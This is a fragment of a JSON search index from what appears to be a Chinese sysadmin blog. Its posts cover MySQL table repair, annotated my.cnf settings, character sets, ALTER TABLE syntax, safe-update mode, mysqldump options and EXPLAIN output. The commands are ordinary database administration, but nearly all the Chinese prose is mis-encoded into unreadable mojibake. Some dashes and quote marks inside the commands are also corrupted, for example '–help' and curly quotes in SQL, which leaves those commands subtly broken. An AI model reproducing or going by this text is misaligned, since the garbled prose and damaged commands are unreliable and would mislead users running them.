20:08","objectID":"/post/354/:0:0","tags":["wordpress"],"title":"è®°ä¸€æ¬¡wordpress4.7è¿ç§»ä¸€ç³»åˆ—é—®é¢˜ï¼","uri":"/post/354/"},{"categories":["å…¶ä»–","ç›‘æ§"],"content":"å¤‡ä»½æ•°æ®åº“æ—¶æŠ¥é”™ï¼šIncorrect file format â€˜syslogâ€™ when using LOCK TABLES æŸ¥çœ‹syslog.MYIæ–‡ä»¶å¤§å°ä¸º0ï¼Œåˆ¤æ–­æ˜¯ç´¢å¼•æŸå è¿›å…¥mysqlæ‰§è¡Œï¼š REPAIR TABLE cacti.syslog USE_FRM; syslog_incomingè¡¨ä¹Ÿæœ‰é—®é¢˜ Incorrect file format â€˜syslog_incomingâ€™ when using LOCK TABLES ç»§ç»­æ‰§è¡Œï¼š REPAIR TABLE cacti.syslog_incoming USE_FRM; ","date":"2019-06-01 20:07","objectID":"/post/352/:0:0","tags":["cacti"],"title":"cacti-Incorrect file format 'syslog' ... LOCK TABLES","uri":"/post/352/"},{"categories":["ç³»ç»ŸæœåŠ¡","databases"],"content":"åŸæ–‡ï¼šhttps://www.cnblogs.com/langdashu/p/5889352.html å‚æ•°è¯¦è§£ï¼ˆè¡¥å……ingâ€¦ï¼‰ [client] #å®¢æˆ·ç«¯è®¾ç½®ï¼Œå³å®¢æˆ·ç«¯é»˜è®¤çš„è¿æ¥å‚æ•° port = 3307â€ƒ#é»˜è®¤è¿æ¥ç«¯å£ socket = /data/mysqldata/3307/mysql.sock #ç”¨äºæœ¬åœ°è¿æ¥çš„socketå¥—æ¥å­— default-character-set = utf8mb4â€ƒ#ç¼–ç  [mysqld] #æœåŠ¡ç«¯åŸºæœ¬è®¾ç½® port = 3307 MySQLç›‘å¬ç«¯å£ socket = /data/mysqldata/3307/mysql.sockâ€ƒ#ä¸ºMySQLå®¢æˆ·ç«¯ç¨‹åºå’ŒæœåŠ¡å™¨ä¹‹é—´çš„æœ¬åœ°é€šè®¯æŒ‡å®šä¸€ä¸ªå¥—æ¥å­—æ–‡ä»¶ pid-file = /data/mysqldata/3307/mysql.pidâ€ƒ#pidæ–‡ä»¶æ‰€åœ¨ç›®å½• basedir = /usr/local/mysql-5.7.11â€ƒ#ä½¿ç”¨è¯¥ç›®å½•ä½œä¸ºæ ¹ç›®å½•ï¼ˆå®‰è£…ç›®å½•ï¼‰ datadir = /data/mysqldata/3307/dataâ€ƒ#æ•°æ®æ–‡ä»¶å­˜æ”¾çš„ç›®å½• tmpdir = /data/mysqldata/3307/tmp #MySQLå­˜æ”¾ä¸´æ—¶æ–‡ä»¶çš„ç›®å½• character_set_server = utf8mb4 #æœåŠ¡ç«¯é»˜è®¤ç¼–ç ï¼ˆæ•°æ®åº“çº§åˆ«ï¼‰ collation_server = utf8mb4_bin #æœåŠ¡ç«¯é»˜è®¤çš„æ¯”å¯¹è§„åˆ™ï¼Œæ’åºè§„åˆ™ user = mysql #MySQLå¯åŠ¨ç”¨æˆ· log_bin_trust_function_creators = 1 #This variable applies when binary logging is enabled. It controls whether stored function creators can be trusted not to create stored functions that will cause #unsafe events to be written to the binary log. If set to 0 (the default), users are not permitted to create or alter stored functions unless they have the SUPER #privilege in addition to the CREATE ROUTINE or ALTER ROUTINE privilege. å¼€å¯äº†binlogåï¼Œå¿…é¡»è®¾ç½®è¿™ä¸ªå€¼ä¸º1.ä¸»è¦æ˜¯è€ƒè™‘binlogå®‰å…¨ performance_schema = 0 #æ€§èƒ½ä¼˜åŒ–çš„å¼•æ“ï¼Œé»˜è®¤å…³é—­ secure_auth = 1â€ƒ#secure_auth ä¸ºäº†é˜²æ­¢ä½ç‰ˆæœ¬çš„MySQLå®¢æˆ·ç«¯(\u003c4.1)ä½¿ç”¨æ—§çš„å¯†ç è®¤è¯æ–¹å¼è®¿é—®é«˜ç‰ˆæœ¬çš„æœåŠ¡å™¨ã€‚MySQL 5.6.7å¼€å§‹secure_auth é»˜è®¤ä¸ºå¯ç”¨å€¼1 #ft_min_word_len = 1 #å¼€å¯å…¨æ–‡ç´¢å¼• #myisam_recover #è‡ªåŠ¨ä¿®å¤MySQLçš„myisamè¡¨ explicit_defaults_for_timestamp #æ˜ç¡®æ—¶é—´æˆ³é»˜è®¤nullæ–¹å¼ event_scheduler #è®¡åˆ’ä»»åŠ¡ï¼ˆäº‹ä»¶è°ƒåº¦å™¨ï¼‰ skip-external-lockingâ€ƒ#è·³è¿‡å¤–éƒ¨é”å®š;External-lockingç”¨äºå¤šè¿›ç¨‹æ¡ä»¶ä¸‹ä¸ºMyISAMæ•°æ®è¡¨è¿›è¡Œé”å®š skip-name-resolveâ€ƒ#è·³è¿‡å®¢æˆ·ç«¯åŸŸåè§£æï¼›å½“æ–°çš„å®¢æˆ·è¿æ¥mysqldæ—¶ï¼Œmysqldåˆ›å»ºä¸€ä¸ªæ–°çš„çº¿ç¨‹æ¥å¤„ç†è¯·æ±‚ã€‚è¯¥çº¿ç¨‹å…ˆæ£€æŸ¥æ˜¯å¦ä¸»æœºååœ¨ä¸»æœºåç¼“å­˜ä¸­ã€‚å¦‚æœä¸åœ¨ï¼Œçº¿ç¨‹è¯•å›¾è§£æä¸»æœºåã€‚ #ä½¿ç”¨è¿™ä¸€é€‰é¡¹ä»¥æ¶ˆé™¤MySQLè¿›è¡ŒDNSè§£æçš„æ—¶é—´ã€‚ä½†éœ€è¦æ³¨æ„ï¼Œå¦‚æœå¼€å¯è¯¥é€‰é¡¹ï¼Œåˆ™æ‰€æœ‰è¿œç¨‹ä¸»æœºè¿æ¥æˆæƒéƒ½è¦ä½¿ç”¨IPåœ°å€æ–¹å¼ï¼Œå¦åˆ™MySQLå°†æ— æ³•æ­£å¸¸å¤„ç†è¿æ¥è¯·æ±‚! #bind-address = 127.0.0.1â€ƒ#MySQLç»‘å®šIP skip-slave-startâ€ƒ#ä¸ºäº†å®‰å…¨èµ·è§ï¼Œå¤åˆ¶ç¯å¢ƒçš„æ•°æ®åº“è¿˜æ˜¯è®¾ç½®â€“skip-slave-startå‚æ•°ï¼Œé˜²æ­¢å¤åˆ¶éšç€mysqlå¯åŠ¨è€Œè‡ªåŠ¨å¯åŠ¨ slave_net_timeout = 30 #The number of seconds to wait for more data from a master/slave connection before aborting the read. MySQLä¸»ä»å¤åˆ¶çš„æ—¶å€™ï¼Œ #å½“Masterå’ŒSlaveä¹‹é—´çš„ç½‘ç»œä¸­æ–­ï¼Œä½†æ˜¯Masterå’ŒSlaveæ— æ³•å¯Ÿè§‰çš„æƒ…å†µä¸‹ï¼ˆæ¯”å¦‚é˜²ç«å¢™æˆ–è€…è·¯ç”±é—®é¢˜ï¼‰ã€‚ #Slaveä¼šç­‰å¾…slave_net_timeoutè®¾ç½®çš„ç§’æ•°åï¼Œæ‰èƒ½è®¤ä¸ºç½‘ç»œå‡ºç°æ•…éšœï¼Œç„¶åæ‰ä¼šé‡è¿å¹¶ä¸”è¿½èµ¶è¿™æ®µæ—¶é—´ä¸»åº“çš„æ•°æ®ã€‚ #1.ç”¨è¿™ä¸‰ä¸ªå‚æ•°æ¥åˆ¤æ–­ä¸»ä»æ˜¯å¦å»¶è¿Ÿæ˜¯ä¸å‡†ç¡®çš„Slave_IO_Running,Slave_SQL_Running,Seconds_Behind_Master.è¿˜æ˜¯ç”¨pt-heartbeatå§ã€‚ #2.slave_net_timeoutä¸è¦ç”¨é»˜è®¤å€¼ï¼Œè®¾ç½®ä¸€ä¸ªä½ èƒ½æ¥å—çš„å»¶æ—¶æ—¶é—´ã€‚ local-infile = 0 #è®¾å®šæ˜¯å¦æ”¯æŒå‘½ä»¤load data local infileã€‚å¦‚æœæŒ‡å®šlocalå…³é”®è¯ï¼Œåˆ™è¡¨æ˜æ”¯æŒä»å®¢æˆ·ä¸»æœºè¯»æ–‡ä»¶ back_log = 1024 #æŒ‡å®šMySQLå¯èƒ½çš„è¿æ¥æ•°é‡ã€‚å½“MySQLä¸»çº¿ç¨‹åœ¨å¾ˆçŸ­çš„æ—¶é—´å†…å¾—åˆ°éå¸¸å¤šçš„è¿æ¥è¯·æ±‚ï¼Œè¯¥å‚æ•°å°±èµ·ä½œç”¨ï¼Œä¹‹åä¸»çº¿ç¨‹èŠ±äº›æ—¶é—´ï¼ˆå°½ç®¡å¾ˆçŸ­ï¼‰æ£€æŸ¥è¿æ¥å¹¶ä¸”å¯åŠ¨ä¸€ä¸ªæ–°çº¿ç¨‹ã€‚ #back_logå‚æ•°çš„å€¼æŒ‡å‡ºåœ¨MySQLæš‚æ—¶åœæ­¢å“åº”æ–°è¯·æ±‚ä¹‹å‰çš„çŸ­æ—¶é—´å†…å¤šå°‘ä¸ªè¯·æ±‚å¯ä»¥è¢«å­˜åœ¨å †æ ˆä¸­ã€‚ #sql_mode = â€˜PIPES_AS_CONCAT,ANSI_QUOTES,IGNORE_SPACE,NO_KEY_OPTIONS,NO_TABLE_OPTIONS,NO_FIELD_OPTIONS,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTIONâ€™ sql_mode = NO_ENGINE_SUBSTITUTION,NO_AUTO_CREATE_USERâ€ƒ#sql_mode,å®šä¹‰äº†mysqlåº”è¯¥æ”¯æŒçš„sqlè¯­æ³•ï¼Œæ•°æ®æ ¡éªŒç­‰! NO_AUTO_CREATE_USERï¼šç¦æ­¢GRANTåˆ›å»ºå¯†ç ä¸ºç©ºçš„ç”¨æˆ·ã€‚ #NO_ENGINE_SUBSTITUTION å¦‚æœéœ€è¦çš„å­˜å‚¨å¼•æ“è¢«ç¦ç”¨æˆ–æœªç¼–è¯‘ï¼Œå¯ä»¥é˜²æ­¢è‡ªåŠ¨æ›¿æ¢å­˜å‚¨å¼•æ“ key_buffer_size = 32Mâ€ƒ#ç´¢å¼•å—çš„ç¼“å†²åŒºå¤§å°ï¼Œå¯¹MyISAMè¡¨æ€§èƒ½å½±å“æœ€å¤§çš„ä¸€ä¸ªå‚æ•°.å†³å®šç´¢å¼•å¤„ç†çš„é€Ÿåº¦ï¼Œå°¤å…¶æ˜¯ç´¢å¼•è¯»çš„é€Ÿåº¦ã€‚é»˜è®¤å€¼æ˜¯16Mï¼Œé€šè¿‡æ£€æŸ¥çŠ¶æ€å€¼Key_read_requests #å’ŒKey_readsï¼Œå¯ä»¥çŸ¥é“key_buffer_sizeè®¾ç½®æ˜¯å¦åˆç† max_allowed_packet = 512Mâ€ƒ#ä¸€ä¸ªæŸ¥è¯¢è¯­å¥åŒ…çš„æœ€å¤§å°ºå¯¸ã€‚æ¶ˆæ¯ç¼“å†²åŒºè¢«åˆå§‹åŒ–ä¸ºnet_buffer_lengthå­—èŠ‚ï¼Œä½†æ˜¯å¯åœ¨éœ€è¦æ—¶å¢åŠ åˆ°max_allowed_packetä¸ªå­—èŠ‚ã€‚ #è¯¥å€¼å¤ªå°åˆ™ä¼šåœ¨å¤„ç†å¤§åŒ…æ—¶äº§ç”Ÿé”™è¯¯ã€‚å¦‚æœä½¿ç”¨å¤§çš„BLOBåˆ—ï¼Œå¿…é¡»å¢åŠ è¯¥å€¼ã€‚ #è¿™ä¸ªå€¼æ¥é™åˆ¶serveræ¥å—çš„æ•°æ®åŒ…å¤§å°ã€‚æœ‰æ—¶å€™å¤§çš„æ’å…¥å’Œæ›´æ–°ä¼šå—max_allowed_packet å‚æ•°é™åˆ¶ï¼Œå¯¼è‡´å†™å…¥æˆ–è€…æ›´æ–°å¤±è´¥ã€‚ thread_stack = 256Kâ€ƒ#çº¿ç¨‹ç¼“å­˜ï¼›ä¸»è¦ç”¨æ¥å­˜æ”¾æ¯ä¸€ä¸ªçº¿ç¨‹è‡ªèº«çš„æ ‡è¯†ä¿¡æ¯ï¼Œå¦‚çº¿ç¨‹idï¼Œçº¿ç¨‹è¿è¡Œæ—¶åŸºæœ¬ä¿¡æ¯ç­‰ç­‰ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ thread_stack å‚æ•°æ¥è®¾ç½®ä¸ºæ¯ä¸€ä¸ªçº¿ç¨‹æ ˆåˆ†é…å¤šå¤§çš„å†…å­˜ã€‚ sort_buffer_size = 16Mâ€ƒ#æ˜¯MySQLæ‰§è¡Œæ’åºä½¿ç”¨çš„ç¼“å†²å¤§å°ã€‚å¦‚æœæƒ³è¦å¢åŠ ORDER BYçš„é€Ÿåº¦ï¼Œé¦–å…ˆçœ‹æ˜¯å¦å¯ä»¥è®©MySQLä½¿ç”¨ç´¢å¼•è€Œä¸æ˜¯é¢å¤–çš„æ’åºé˜¶æ®µã€‚ #å¦‚æœä¸èƒ½ï¼Œå¯ä»¥å°è¯•å¢åŠ sort_buffer_sizeå˜é‡çš„å¤§å°ã€‚ read_buffer_size = 16Mâ€ƒ#æ˜¯MySQLè¯»å…¥ç¼“å†²åŒºå¤§å°ã€‚å¯¹è¡¨è¿›è¡Œé¡ºåºæ‰«æçš„è¯·æ±‚å°†åˆ†é…ä¸€ä¸ªè¯»å…¥ç¼“å†²åŒºï¼ŒMySQLä¼šä¸ºå®ƒåˆ†é…ä¸€æ®µå†…å­˜ç¼“å†²åŒºã€‚read_buffer_sizeå˜é‡æ§åˆ¶è¿™ä¸€ç¼“å†²åŒºçš„å¤§å°ã€‚ #å¦‚æœå¯¹è¡¨çš„é¡ºåºæ‰«æè¯·æ±‚éå¸¸é¢‘ç¹ï¼Œå¹¶ä¸”ä½ è®¤ä¸ºé¢‘ç¹æ‰«æè¿›è¡Œå¾—å¤ªæ…¢ï¼Œå¯ä»¥é€šè¿‡å¢åŠ è¯¥å˜é‡å€¼ä»¥åŠå†…å­˜ç¼“å†²åŒºå¤§å°æé«˜å…¶æ€§èƒ½ã€‚ join_buffer_size = 16Mâ€ƒ#åº”ç”¨ç¨‹åºç»å¸¸ä¼šå‡ºç°ä¸€äº›ä¸¤è¡¨ï¼ˆæˆ–å¤šè¡¨ï¼‰Joinçš„æ“ä½œéœ€æ±‚ï¼ŒMySQLåœ¨å®ŒæˆæŸäº› Join éœ€æ±‚çš„æ—¶å€™ï¼ˆall/index joinï¼‰ï¼Œä¸ºäº†å‡å°‘å‚ä¸Joinçš„â€œè¢«é©±åŠ¨è¡¨â€çš„ #è¯»å–æ¬¡æ•°ä»¥æé«˜æ€§èƒ½ï¼Œéœ€è¦ä½¿ç”¨åˆ° Join Buffer æ¥ååŠ©å®Œæˆ Joinæ“ä½œã€‚å½“ Join Buffer å¤ªå°ï¼ŒMySQL ä¸ä¼šå°†è¯¥ Buffer å­˜å…¥ç£ç›˜æ–‡ä»¶ï¼Œ #è€Œæ˜¯å…ˆå°†Join Bufferä¸­çš„ç»“æœé›†ä¸éœ€è¦ Join çš„è¡¨è¿›è¡Œ Join æ“ä½œï¼Œ #ç„¶åæ¸…ç©º Join Buffer ä¸­çš„æ•°æ®ï¼Œç»§ç»­å°†å‰©ä½™çš„ç»“æœé›†å†™å…¥æ­¤ Buffer ä¸­ï¼Œå¦‚æ­¤å¾€å¤ã€‚è¿™åŠ¿å¿…ä¼šé€ æˆè¢«é©±åŠ¨è¡¨éœ€è¦è¢«å¤šæ¬¡è¯»å–ï¼Œæˆå€å¢åŠ  IO è®¿é—®ï¼Œé™ä½æ•ˆç‡ã€‚ read_rnd_buffer_size = 32Mâ€ƒ#æ˜¯MySQLçš„éšæœºè¯»ç¼“å†²åŒºå¤§å°ã€‚å½“æŒ‰ä»»æ„é¡ºåºè¯»å–è¡Œæ—¶(ä¾‹å¦‚ï¼ŒæŒ‰ç…§æ’åºé¡ºåº)ï¼Œå°†åˆ†é…ä¸€ä¸ªéšæœºè¯»ç¼“å­˜åŒºã€‚è¿›è¡Œæ’åºæŸ¥è¯¢æ—¶ï¼ŒMySQLä¼šé¦–å…ˆæ‰«æä¸€éè¯¥ç¼“å†²ï¼Œä»¥é¿å…ç£ç›˜æœç´¢ï¼Œ #æé«˜æŸ¥è¯¢é€Ÿåº¦ï¼Œå¦‚æœéœ€è¦æ’åºå¤§é‡æ•°æ®ï¼Œå¯é€‚å½“è°ƒé«˜è¯¥å€¼ã€‚ä½†MySQLä¼šä¸ºæ¯ä¸ªå®¢æˆ·è¿æ¥å‘æ”¾è¯¥ç¼“å†²ç©ºé—´ï¼Œæ‰€ä»¥åº”å°½é‡é€‚å½“è®¾ç½®è¯¥å€¼ï¼Œä»¥é¿å…å†…å­˜å¼€é”€è¿‡å¤§ã€‚ net_buffer_length = 16Kâ€ƒ#é€šä¿¡ç¼“å†²åŒºåœ¨æŸ¥è¯¢","date":"2019-06-01 20:04","objectID":"/post/350/:0:0","tags":["mysql"],"title":"mysql-MySQLé…ç½®æ–‡ä»¶my.cnfçš„ç†è§£","uri":"/post/350/"},{"categories":["ç³»ç»ŸæœåŠ¡","databases"],"content":"æŸ¥çœ‹åº“ã€è¡¨ã€å­—æ®µçš„å­—ç¬¦é›† mysql\u003e show create database åº“å; mysql\u003e show create table è¡¨å; ä¿®æ”¹åº“çš„å­—ç¬¦é›† mysql\u003e alter database åº“å default character set utf8 collate utf8_general_ci; ä¿®æ”¹è¡¨çš„å­—ç¬¦é›† mysql\u003e alter table è¡¨å default character set utf8collateÂ utf8_general_ci; ä¿®æ”¹å­—æ®µçš„å­—ç¬¦é›† mysql\u003e alter tableè¡¨åmodify name char(10)Â collateÂ utf8_general_ci; æŸ¥çœ‹å­—ç¬¦é›† show variables like â€˜%character%â€™; ä¿®æ”¹å®¢æˆ·ç«¯å­—ç¬¦é›† ä¸´æ—¶ï¼š mysql\u003e set names utf8; æ°¸ä¹…ï¼šä¿®æ”¹my.cnfé…ç½®æ–‡ä»¶ [client] default-character-set=utf8 ä¿®æ”¹æœåŠ¡ç«¯å­—ç¬¦é›† æ°¸ä¹…ï¼šä¿®æ”¹my.cnfé…ç½®æ–‡ä»¶ [mysqld] init_connect=â€˜SET NAMES utf8â€™ default-character-set=utf8Â # mysql5.1åŠä»¥å‰ç‰ˆæœ¬ or character-set-server=utf8Â # å…¶ä»–ç‰ˆæœ¬ Â ","date":"2019-06-01 20:03","objectID":"/post/347/:0:0","tags":["mysql"],"title":"mysql-ä¸­æ–‡ä¹±ç è®¾ç½®å­—ç¬¦é›†ç¼–ç ","uri":"/post/347/"},{"categories":["ç³»ç»ŸæœåŠ¡","databases"],"content":"æ›´æ”¹è¡¨å è¯­æ³•ï¼šrename table è¡¨å to æ–°è¡¨å; mysql\u003e rename table test to test_new; åˆ é™¤è¡¨ mysql\u003e drop table test_new; ","date":"2019-06-01 19:59","objectID":"/post/345/:0:0","tags":["mysql"],"title":"mysql-åˆ è¡¨ä»¥åŠæ›´æ”¹è¡¨å","uri":"/post/345/"},{"categories":["ç³»ç»ŸæœåŠ¡","databases"],"content":"åœ¨è¡¨ä¸­å¢åŠ å­—æ®µ(åœ¨æœ€åæ·»åŠ å­—æ®µ) è¯­æ³•ï¼šalter table è¡¨å add å­—æ®µåÂ å­—æ®µç±»å‹ï¼› mysql\u003e alter table test add sex char(4); åœ¨æŒ‡å®šä½ç½®å¢åŠ å­—æ®µ afterï¼šåœ¨xxå­—æ®µä¹‹åæ·»åŠ å­—æ®µ firstï¼šÂ åœ¨æœ€å‰é¢æ·»åŠ å­—æ®µ è¯­æ³•ï¼šalter table è¡¨å add è¦æ·»åŠ çš„å­—æ®µåÂ å­—æ®µç±»å‹ afterå­—æ®µåï¼› mysql\u003e alter table test add age int(3) after name; mysql\u003e alter table test add qq int(10) first; è°ƒæ•´å­—æ®µé¡ºåº è¯­æ³•:alter table è¡¨å modify è¦ä¿®æ”¹çš„å­—æ®µåç§° å­—æ®µç±»å‹ after å­—æ®µå; mysql\u003e alter table test modify sex_new char(4) after name; åˆ é™¤æŒ‡å®šå­—æ®µ è¯­æ³•ï¼šalter table è¡¨å drop å­—æ®µå; mysql\u003e alter table test drop qq; ä¿®æ”¹å­—æ®µç±»å‹ è¯­æ³•ï¼šalter table è¡¨å modifyÂ å­—æ®µç±»å‹; mysql\u003e alter table test modify age int(4); ä¿®æ”¹å­—æ®µåç§° è¯­æ³•ï¼šalter table è¡¨å change æ—§åç§° æ–°åç§° å­—æ®µç±»å‹; mysql\u003e alter table test change sex sex_new char(4); æ·»åŠ è¡¨æ³¨é‡Š è¯­æ³•ï¼šalter table è¡¨å comment â€˜æ³¨é‡Šâ€™; mysql\u003e alter table test comment â€˜æµ‹è¯•è¡¨â€™; æ·»åŠ å­—æ®µæ³¨é‡Š æ–¹æ³•1ï¼š è¯­æ³•ï¼šalter table è¡¨å modify å­—æ®µå å­—æ®µç±»å‹ comment æ³¨é‡Š; mysql\u003e alter table test modify name char(20) comment â€˜åå­—â€™; æ–¹æ³•2ï¼š è¯­æ³•ï¼šalter table è¡¨å change å­—æ®µåÂ å­—æ®µåÂ å­—æ®µç±»å‹ comment â€˜æ³¨é‡Šâ€™; mysql\u003e alter table test change name name char(20) comment 'å§“å'; Â  æŸ¥çœ‹å­—æ®µæ³¨é‡Š è¯­æ³•ï¼šshow full fields from è¡¨å; mysql\u003e show full fields from student; æ·»åŠ è‡ªå¢å±æ€§çš„ä¸»é”®ç´¢å¼•ï¼š è¯­æ³•ï¼šalter table è¡¨å change åˆ—åç§° æ–°çš„åˆ—åç§°Â å­—æ®µç±»å‹ primary key auto_increment; mysql\u003ealter table student change id id int primary key auto_increment; ","date":"2019-06-01 19:58","objectID":"/post/343/:0:0","tags":["mysql"],"title":"mysql-å¢åˆ æ”¹è¡¨çš„å­—æ®µ","uri":"/post/343/"},{"categories":["ç³»ç»ŸæœåŠ¡","databases"],"content":"[root@db01 ~]# mysql â€“help | grep â€œ-Uâ€ -U, â€“safe-updatesÂ Only allow UPDATE and DELETE that uses keys. -U, â€“i-am-a-dummyÂ Synonym for option â€“safe-updates, -U. è¯´æ˜ï¼šåœ¨mysqlå‘½ä»¤åŠ ä¸Šé€‰é¡¹-Uåï¼Œå½“æ‰§è¡ŒUPDATEæˆ–DELETEæ—¶ï¼Œæ²¡æœ‰WHEREæˆ–LIMITå…³é”®å­—çš„æ—¶å€™ï¼Œmysqlç¨‹åºå°±ä¼šæ‹’ç»æ‰§è¡Œ ä¾‹å¦‚ï¼šæ‰§è¡Œä»¥ä¸‹å†…å®¹æ—¶ æ‹’ç»æ‰§è¡Œ mysql -uroot -p -S /data/3306/mysql.sock -U mysql\u003e update test set name=â€˜soulâ€™; ERROR 1175 (HY000): You are using safe update mode and you tried to update a table without a WHERE that uses a KEY column å°†mysql -Uåˆ¶ä½œæˆåˆ«åï¼Œæ°¸ä¹…ç”Ÿæ•ˆéœ€è¦è¿½åŠ åˆ°/etc/profileæ–‡ä»¶ä¸­ [root@db01 ~]#Â alias mysql=â€œmysql -Uâ€ æ­¤æ—¶ç™»å½•mysqlï¼Œä¸åŠ -Uï¼Œä¾ç„¶ä¼šæœ‰å®‰å…¨æç¤º [root@db01 ~]# mysql -uroot -p -S /data/3306/mysql.sock mysql\u003e update test set name=â€˜soulâ€™;ERROR 1175 (HY000): You are using safe update mode and you tried to update a table without a WHERE that uses a KEY column æ³¨:æ­¤æ–¹æ³•åªæœ‰åœ¨æœ¬åœ°ç™»å½•æ—¶æ‰èµ·ä½œç”¨ ","date":"2019-06-01 19:56","objectID":"/post/340/:0:0","tags":["mysql"],"title":"mysqlé˜²æ­¢è¯¯æ“ä½œ,å¼€å¯-Uå‚æ•°","uri":"/post/340/"},{"categories":["ç³»ç»ŸæœåŠ¡","databases"],"content":"1.å‚æ•° -A å…¨éƒ¨å¤‡ä»½ mysqldump -uroot -p -A \u003e /data/backup/full.sql -B å¤‡ä»½å•åº“æˆ–å¤šåº“ mysqldump -uroot -p -S /data/3306/mysql.sock -B soulchild \u003e /data/backup/soulchild.sql or mysqldump -uroot -p -B wordpress emlog \u003e /data/backup/wpaeml.sql å•è¡¨æˆ–å¤šè¡¨å¤‡ä»½ åº“åÂ è¡¨å mysqldump -uroot -p wordpress userÂ \u003e /data/backup/full.sql -d åªå¤‡ä»½è¡¨çš„ç»“æ„ mysqldump -uroot -p -d wordpress \u003e /data/backup/wp.sql mysqldumpç‰¹æ®ŠåŠŸèƒ½å‚æ•° -R â€“triggers -E ï¼šå¤‡ä»½è¿‡ç¨‹ã€å‡½æ•°ã€è§¦å‘å™¨ã€äº‹ä»¶ç­‰ â€“master-data=2: â€“single-transaction â€“set-gtid-purged=OFF è¾ƒä¸ºå®Œæ•´å…¨å¤‡ä»½è¯­å¥ï¼š mysqldump -uroot -p123 -A â€“master-data=2 â€“single-transaction -R â€“triggers -E â€“set-gtid-purged=OFF â€“max-allowed-packet=64M \u003e/data/backup/full.sql ","date":"2019-06-01 19:53","objectID":"/post/334/:0:0","tags":["mysql"],"title":"mysqldumpå¤‡ä»½æ•°æ®åº“","uri":"/post/334/"},{"categories":["ç³»ç»ŸæœåŠ¡","databases"],"content":"åœ¨æŸ¥è¯¢è¯­å¥å‰åŠ explain ä¾‹: mysql\u003e explain select * from test where name=â€˜soulchildâ€™\\G; *************************** 1. row *************************** id: 1 select_type: SIMPLE table: test type: ALL possible_keys: NULL key: NULL key_len: NULL ref: NULL rows: 5 Extra: Using where 1 row in set (0.00 sec) è¯´æ˜ï¼š idï¼šSELECTè¯†åˆ«ç¬¦ã€‚è¿™æ˜¯SELECTçš„æŸ¥è¯¢åºåˆ—å· select_type:å¯ä»¥ä¸ºä»¥ä¸‹ä»»ä½•ä¸€ç§ SIMPLE:ç®€å•SELECT(ä¸ä½¿ç”¨UNIONæˆ–å­æŸ¥è¯¢) PRIMARY:æœ€å¤–é¢çš„SELECT UNION:UNIONä¸­çš„ç¬¬äºŒä¸ªæˆ–åé¢çš„SELECTè¯­å¥ DEPENDENT UNION:UNIONä¸­çš„ç¬¬äºŒä¸ªæˆ–åé¢çš„SELECTè¯­å¥,å–å†³äºå¤–é¢çš„æŸ¥è¯¢ UNION RESULT:UNION çš„ç»“æœ SUBQUERY:å­æŸ¥è¯¢ä¸­çš„ç¬¬ä¸€ä¸ªSELECT DEPENDENT SUBQUERY:å­æŸ¥è¯¢ä¸­çš„ç¬¬ä¸€ä¸ªSELECT,å–å†³äºå¤–é¢çš„æŸ¥è¯¢ DERIVED:å¯¼å‡ºè¡¨çš„SELECT(FROMå­å¥çš„å­æŸ¥è¯¢) table:Â è¾“å‡ºçš„è¡Œæ‰€å¼•ç”¨çš„è¡¨Â type:Â è”æ¥ç±»å‹ï¼Œä¸‹é¢ç»™å‡ºå„ç§è”æ¥ç±»å‹,æŒ‰ç…§ä»æœ€ä½³ç±»å‹åˆ°æœ€åç±»å‹è¿›è¡Œæ’åº: system:è¡¨ä»…æœ‰ä¸€è¡Œ(=ç³»ç»Ÿè¡¨)ã€‚è¿™æ˜¯constè”æ¥ç±»å‹çš„ä¸€ä¸ªç‰¹ä¾‹ã€‚ const:è¡¨æœ€å¤šæœ‰ä¸€ä¸ªåŒ¹é…è¡Œ,å®ƒå°†åœ¨æŸ¥è¯¢å¼€å§‹æ—¶è¢«è¯»å–ã€‚å› ä¸ºä»…æœ‰ä¸€è¡Œ,åœ¨è¿™è¡Œçš„åˆ—å€¼å¯è¢«ä¼˜åŒ–å™¨å‰©ä½™éƒ¨åˆ†è®¤ä¸ºæ˜¯å¸¸æ•°ã€‚constè¡¨å¾ˆå¿«,å› ä¸ºå®ƒä»¬åªè¯»å–ä¸€æ¬¡! eq_ref:å¯¹äºæ¯ä¸ªæ¥è‡ªäºå‰é¢çš„è¡¨çš„è¡Œç»„åˆ,ä»è¯¥è¡¨ä¸­è¯»å–ä¸€è¡Œã€‚è¿™å¯èƒ½æ˜¯æœ€å¥½çš„è”æ¥ç±»å‹,é™¤äº†constç±»å‹ã€‚ ref:å¯¹äºæ¯ä¸ªæ¥è‡ªäºå‰é¢çš„è¡¨çš„è¡Œç»„åˆ,æ‰€æœ‰æœ‰åŒ¹é…ç´¢å¼•å€¼çš„è¡Œå°†ä»è¿™å¼ è¡¨ä¸­è¯»å–ã€‚ ref_or_null:è¯¥è”æ¥ç±»å‹å¦‚åŒref,ä½†æ˜¯æ·»åŠ äº†MySQLå¯ä»¥ä¸“é—¨æœç´¢åŒ…å«NULLå€¼çš„è¡Œã€‚ index_merge:è¯¥è”æ¥ç±»å‹è¡¨ç¤ºä½¿ç”¨äº†ç´¢å¼•åˆå¹¶ä¼˜åŒ–æ–¹æ³•ã€‚ unique_subquery:è¯¥ç±»å‹æ›¿æ¢äº†ä¸‹é¢å½¢å¼çš„INå­æŸ¥è¯¢çš„ref: value IN (SELECT primary_key FROM single_table WHERE some_expr) unique_subqueryæ˜¯ä¸€ä¸ªç´¢å¼•æŸ¥æ‰¾å‡½æ•°,å¯ä»¥å®Œå…¨æ›¿æ¢å­æŸ¥è¯¢,æ•ˆç‡æ›´é«˜ã€‚ index_subquery:è¯¥è”æ¥ç±»å‹ç±»ä¼¼äºunique_subqueryã€‚å¯ä»¥æ›¿æ¢INå­æŸ¥è¯¢,ä½†åªé€‚åˆä¸‹åˆ—å½¢å¼çš„å­æŸ¥è¯¢ä¸­çš„éå”¯ä¸€ç´¢å¼•: value IN (SELECT key_column FROM single_table WHERE some_expr) range:åªæ£€ç´¢ç»™å®šèŒƒå›´çš„è¡Œ,ä½¿ç”¨ä¸€ä¸ªç´¢å¼•æ¥é€‰æ‹©è¡Œã€‚ index:è¯¥è”æ¥ç±»å‹ä¸ALLç›¸åŒ,é™¤äº†åªæœ‰ç´¢å¼•æ ‘è¢«æ‰«æã€‚è¿™é€šå¸¸æ¯”ALLå¿«,å› ä¸ºç´¢å¼•æ–‡ä»¶é€šå¸¸æ¯”æ•°æ®æ–‡ä»¶å°ã€‚ ALL:å¯¹äºæ¯ä¸ªæ¥è‡ªäºå…ˆå‰çš„è¡¨çš„è¡Œç»„åˆ,è¿›è¡Œå®Œæ•´çš„è¡¨æ‰«æã€‚ 